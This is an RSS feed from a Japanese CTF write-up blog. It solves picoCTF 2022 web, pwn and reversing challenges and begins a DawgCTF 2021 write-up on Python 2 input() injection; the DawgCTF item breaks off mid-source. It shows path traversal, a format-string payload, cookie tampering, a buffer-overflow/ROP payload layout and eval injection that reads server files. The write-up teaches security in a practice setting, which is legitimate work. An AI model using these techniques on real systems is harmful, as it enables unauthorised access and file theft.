<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CTF Writeups</title>
    <link>/</link>
    <description>Recent content on CTF Writeups</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 18 Apr 2022 21:12:08 +0900</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>picoCTF 2022</title>
      <link>/picoctf2022/picoctf2022/</link>
      <pubDate>Mon, 18 Apr 2022 21:12:08 +0900</pubDate>
      
      <guid>/picoctf2022/picoctf2022/</guid>
      <description>picoCTF 2022 目次  Web  Forbidden Paths SQL Direct Power Cookie Roboto Sans Secrets SQLiLite Search source   Binary(Pwn)  flag leek File types RPS buffer overflow 0 buffer overflow 1 buffer overflow 2 x-sixty-what   Rev  Fresh Java Bbbbloat unpackme    Forbidden Paths 相対パスを使う。 ../../../../flag.txt
SQL Direct DBに接続して\dからのselect * from flags
Power Cookie CookieのisAdminを1にして読み込む。
Roboto Sans robots.txtを見るとBase64エンコードされたパスがあるのでデコードしてそこにアクセス。
Secrets ソースコードを眺めるとsecretという謎のパスが一段入ってるものが見つかる。アクセスして順に同じことをやるとたどり着く。
SQLiLite シンプルなSQLインジェクション。
Search source CSSファイル内のコメントにフラグがある。</description>
      <content>&lt;h1 id=&#34;picoctf-2022&#34;&gt;picoCTF 2022&lt;/h1&gt;
&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Web
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#forbidden-paths&#34;&gt;Forbidden Paths&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#sql-direct&#34;&gt;SQL Direct&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#power-cookie&#34;&gt;Power Cookie&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#roboto-sans&#34;&gt;Roboto Sans&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#secrets&#34;&gt;Secrets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#sqlilite&#34;&gt;SQLiLite&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#search-source&#34;&gt;Search source&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Binary(Pwn)
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#flag-leek&#34;&gt;flag leek&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#file-types&#34;&gt;File types&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#rps&#34;&gt;RPS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#buffer-overflow-0&#34;&gt;buffer overflow 0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#buffer-overflow-1&#34;&gt;buffer overflow 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#buffer-overflow-2&#34;&gt;buffer overflow 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#x-sixty-what&#34;&gt;x-sixty-what&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rev
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#fresh-java&#34;&gt;Fresh Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#bbbbloat&#34;&gt;Bbbbloat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#unpackme&#34;&gt;unpackme&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;forbidden-paths&#34;&gt;Forbidden Paths&lt;/h2&gt;
&lt;p&gt;相対パスを使う。
&lt;code&gt;../../../../flag.txt&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;sql-direct&#34;&gt;SQL Direct&lt;/h2&gt;
&lt;p&gt;DBに接続して&lt;code&gt;\d&lt;/code&gt;からの&lt;code&gt;select * from flags&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;power-cookie&#34;&gt;Power Cookie&lt;/h2&gt;
&lt;p&gt;CookieのisAdminを1にして読み込む。&lt;/p&gt;
&lt;h2 id=&#34;roboto-sans&#34;&gt;Roboto Sans&lt;/h2&gt;
&lt;p&gt;robots.txtを見るとBase64エンコードされたパスがあるのでデコードしてそこにアクセス。&lt;/p&gt;
&lt;h2 id=&#34;secrets&#34;&gt;Secrets&lt;/h2&gt;
&lt;p&gt;ソースコードを眺めるとsecretという謎のパスが一段入ってるものが見つかる。アクセスして順に同じことをやるとたどり着く。&lt;/p&gt;
&lt;h2 id=&#34;sqlilite&#34;&gt;SQLiLite&lt;/h2&gt;
&lt;p&gt;シンプルなSQLインジェクション。&lt;/p&gt;
&lt;h2 id=&#34;search-source&#34;&gt;Search source&lt;/h2&gt;
&lt;p&gt;CSSファイル内のコメントにフラグがある。&lt;/p&gt;
&lt;h2 id=&#34;flag-leek&#34;&gt;flag leek&lt;/h2&gt;
&lt;p&gt;フォーマットストリング攻撃ができるので読み出す。&lt;br&gt;
&lt;code&gt;echo &#39;AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZ:%36$p&#39; | ./vuln&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;file-types&#34;&gt;File types&lt;/h2&gt;
&lt;p&gt;ファイルの中身を見るとshell archive(shar)というものらしい。shで解凍するとarという圧縮形式のファイルが出てくる。アーカイバをインストールして解凍すると次はcpioという形式のファイルが出てくる。bzip2、gzip、lgipと続いてそろそろ終わりかと思うがまだ終わらない。&lt;code&gt;ASCII text&lt;/code&gt;と出てくることを願いながらfileコマンドを叩いて、アーカイバをインストールし解凍して、を繰り返すとLZ4、LZMA、lzop、lzip、XZで終わる。途中でやめようか迷った。&lt;/p&gt;
&lt;h2 id=&#34;rps&#34;&gt;RPS&lt;/h2&gt;
&lt;p&gt;ソースコードを読むと&lt;code&gt;srand(time(0))&lt;/code&gt;があり、これはタイミング攻撃が可能。手元でも同じように&lt;code&gt;srand(time(0))&lt;/code&gt;の&lt;code&gt;rand() % 3&lt;/code&gt;を出力するCのコードを書いてコンパイルする。Pythonからその実行ファイルを呼び出して勝つ手を出すスクリプトを書いて実行してみるが絶妙にサーバー側と時間がズレていて何度も調整するがなかなか綺麗に合わせられない。ズレがあるとは言え1秒間の間では同じ手が出されるため連勝はしやすい。最終的に完璧な調整は諦めて運よく5連勝できることを待つという方法でフラグをゲット。&lt;/p&gt;
&lt;h2 id=&#34;buffer-overflow-0&#34;&gt;buffer overflow 0&lt;/h2&gt;
&lt;p&gt;適当に長い文字列を入力に渡すとフラグが貰える。&lt;/p&gt;
&lt;h2 id=&#34;buffer-overflow-1&#34;&gt;buffer overflow 1&lt;/h2&gt;
&lt;p&gt;win関数に飛ばせばフラグが貰える。&lt;code&gt;objdump -d vuln&lt;/code&gt;などでwinのアドレスを確認し、バッファオーバーフローでvulnのリターンアドレスをwinのアドレスに書き換える。&lt;/p&gt;
&lt;h2 id=&#34;buffer-overflow-2&#34;&gt;buffer overflow 2&lt;/h2&gt;
&lt;p&gt;これもwin関数に飛ばせばフラグが貰える。しかしwin関数に2つの引数(arg1とarg2)に正しい値を渡さないとフラグが貰えない。vulnのリターンアドレスをwinのアドレスに書き換えるとして、winのアドレスの次にarg1とarg2を置けばフラグが出力される。ここでリモートで試してみるがフラグが貰えない。GDBで試すとどうやらwinのあとにリターンアドレスでarg1を参照してセグフォで落ちている模様。0x804945あたりにpopを4回してretしているありがたいgadgetがあるので、popで引数2個分スタックポインタをずらして、mainのアドレスにリターンさせる。&lt;br&gt;
ペイロードはこんな感じになる。&lt;code&gt;b&amp;quot;A&amp;quot; * (buf_size + 8) + base_addr + win_addr + pop_addr + arg1 + arg2 + main_addr&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;x-sixty-what&#34;&gt;x-sixty-what&lt;/h2&gt;
&lt;p&gt;64bitでのBoF。Pwn初心者なのであまり正しく理解できている自信はないが、Intel CETという機能があり、jmp/callでendbr32/64以外の場所に飛べなくする機構があるらしい(参考リンク: &lt;a href=&#34;https://smallkirby.hatenablog.com/entry/2020/09/10/230629&#34;&gt;【pwn 36.0】Intel CETが、みんなの恋人ROPを殺す&lt;/a&gt;)。flag関数でフラグが貰えるのでBoFでflag関数に飛ばしたあとにmainに飛ばせばフラグゲット。&lt;/p&gt;
&lt;h2 id=&#34;fresh-java&#34;&gt;Fresh Java&lt;/h2&gt;
&lt;p&gt;classファイルをデコンパイルするとフラグを1文字ずつ検証するコードが出てくる。ハードコードされているのでフラグゲット。&lt;/p&gt;
&lt;h2 id=&#34;bbbbloat&#34;&gt;Bbbbloat&lt;/h2&gt;
&lt;p&gt;特定の数値を渡すとフラグが貰える実行ファイルらしい。Ghidraでデコンパイルすると数値がわかる。&lt;/p&gt;
&lt;h2 id=&#34;unpackme&#34;&gt;unpackme&lt;/h2&gt;
&lt;p&gt;UPXでパックされているのでまずアンパックする。若干難読化されているがBbbbloatとほとんど変わらない動作をする実行ファイルが出てくる。Ghidraでデコンパイルしても見づらかったのでIDA Freeを使うと綺麗にデコンパイルされて数値がわかる。GhidraとIDA Freeを適材適所で使い分けられると便利かもしれない。&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title></title>
      <link>/dawgctf2021/dawgctf2021/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/dawgctf2021/dawgctf2021/</guid>
      <description>DawgCTF 2021 Writeup 目次  Pwn  No Step On Snek Jellyspotters MDL Considered Harmful    No Step On Snek 問題 75 points
I heard you guys like python pwnables
nc umbccd.io 4000
Author: trashcanna
解説 ncコマンドで接続すると以下のように表示されます。
Welcome to the aMAZEing Maze Your goal is to get from one side of the board to the other. Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34; W/w - Move up!</description>
      <content>&lt;h1 id=&#34;dawgctf-2021-writeup&#34;&gt;DawgCTF 2021 Writeup&lt;/h1&gt;
&lt;h2 id=&#34;目次&#34;&gt;目次&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Pwn
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#no-step-on-snek&#34;&gt;No Step On Snek&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#jellyspotters&#34;&gt;Jellyspotters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#mdl-considered-harmful&#34;&gt;MDL Considered Harmful&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;no-step-on-snek&#34;&gt;No Step On Snek&lt;/h2&gt;
&lt;h3 id=&#34;問題&#34;&gt;問題&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;75 points&lt;/strong&gt;&lt;br&gt;
I heard you guys like python pwnables&lt;br&gt;
&lt;code&gt;nc umbccd.io 4000&lt;/code&gt;&lt;br&gt;
Author: trashcanna&lt;/p&gt;
&lt;h3 id=&#34;解説&#34;&gt;解説&lt;/h3&gt;
&lt;p&gt;ncコマンドで接続すると以下のように表示されます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Welcome to the aMAZEing Maze
Your goal is to get from one side of the board to the other.
Your character is represented by &amp;#34;OO&amp;#34; and the finish will be &amp;#34;FF&amp;#34;
W/w - Move up!
A/a - Move left!
S/s - Move down!
D/d - Move right!
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|OO         |        |     |        |           |
+  +--+  +  +--+  +  +  +  +--+  +  +--+--+  +  +
|  |  |  |     |  |  |  |  |     |  |        |  |
+  +  +  +--+  +  +--+  +  +  +--+  +  +--+--+  +
|  |  |  |     |     |  |     |  |  |     |     |
+  +  +  +  +--+--+  +--+--+--+  +  +  +  +  +--+
|     |  |        |        |        |  |  |     |
+--+  +  +--+--+  +  +--+--+  +--+--+  +  +--+--+
|     |  |           |     |  |     |  |  |     |
+--+--+  +--+--+--+  +  +  +  +  +  +  +  +  +  +
|        |        |  |  |     |  |     |     |  |
+  +--+--+  +--+  +  +  +--+--+--+  +--+--+--+  +
|  |        |     |  |           |     |        |
+  +  +--+--+  +--+--+--+--+--+  +--+  +  +--+--+
|  |     |  |                 |  |     |        |
+  +--+  +  +--+--+--+--+--+  +  +  +--+--+--+  +
|     |  |              |     |  |  |        |  |
+  +  +  +  +--+--+--+  +  +--+  +  +  +--+  +  +
|  |  |     |           |  |     |     |     |  |
+  +  +--+--+  +--+--+--+  +  +--+--+--+  +--+  +
|  |  |        |        |  |        |  |  |     |
+  +--+  +--+--+  +--+  +  +--+--+  +  +  +  +  +
|  |     |        |     |           |     |  |  |
+  +  +--+--+--+--+  +--+--+--+--+--+  +--+  +  +
|     |     |     |           |  |     |  |  |  |
+  +--+  +  +  +  +--+  +--+  +  +  +--+  +  +  +
|  |     |     |     |  |     |           |  |  |
+  +  +--+--+--+--+  +  +  +--+  +--+--+--+  +  +
|     |           |     |  |     |        |  |  |
+--+--+  +--+--+  +--+--+  +--+--+  +--+  +  +  +
|              |                    |        |FF|
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+


Make your move:
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;まずW, A, S, D以外の文字、例えばZを入れてみると以下のように出力されました。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Make your move: Z
Traceback (most recent call last):
  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 73, in &amp;lt;module&amp;gt;
    __main__()
  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 69, in __main__
    still_playing = make_move(maze)
  File &amp;#34;/home/challuser/nosteponsnek.py&amp;#34;, line 27, in make_move
    move = input(&amp;#34;Make your move: &amp;#34;)
  File &amp;#34;&amp;lt;string&amp;gt;&amp;#34;, line 1, in &amp;lt;module&amp;gt;
NameError: name &amp;#39;Z&amp;#39; is not defined
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;見るからにPythonなのですが、&lt;code&gt;NameError: name &#39;Z&#39; is not defined&lt;/code&gt;とあるため入力がそのままコードとして解釈されています。これはPython2系の仕様であり、input()は受け取った文字列をeval()のように式としてそのまま解釈します。&lt;br&gt;
いろいろ試すと、&lt;code&gt;make_move(1)&lt;/code&gt;や&lt;code&gt;make_move(&amp;quot;a&amp;quot;)&lt;/code&gt;などで引数に渡した値がそのまま返ってくることに気付きます。あとは大体何でもできるのですが、エラー文でファイルのパスが分かっているのでまずこのファイルの中身を見るために&lt;code&gt;make_move(open(&amp;quot;/home/challuser/nosteponsnek.py&amp;quot;).read())&lt;/code&gt;をしてみます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python2.7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; random &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; shuffle, randrange
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;W &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;w &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;A &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;D &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;valid_moves &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [W, w, A, a, S, s, D, d]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;welcome&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Welcome to the aMAZEing Maze&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your goal is to get from one side of the board to the other.&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Your character is represented by &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;OO&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; and the finish will be &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;FF&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;W/w - Move up!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A/a - Move left!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;S/s - Move down!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D/d - Move right!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make_move&lt;/span&gt;(maze):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print maze
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        move &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Make your move: &amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; move &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; valid_moves:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NameError&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# TODO: Move the player around the board&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# Was a little cruched for time this year so I didn&amp;#39;t feel like writing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# the gameplay. I hope that&amp;#39;s okay :/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_last&lt;/span&gt;(s, replace_what, replace_with):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        head, _sep, tail &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rpartition(replace_what)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; head &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; replace_with &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; tail
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Randomly generate the gameboard and insert start/finish&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;make_maze&lt;/span&gt;(w &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        vis &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h)] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ver &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|  &amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h)] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [[]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+--&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; w &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(h &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;walk&lt;/span&gt;(x, y):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                vis[y][x] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
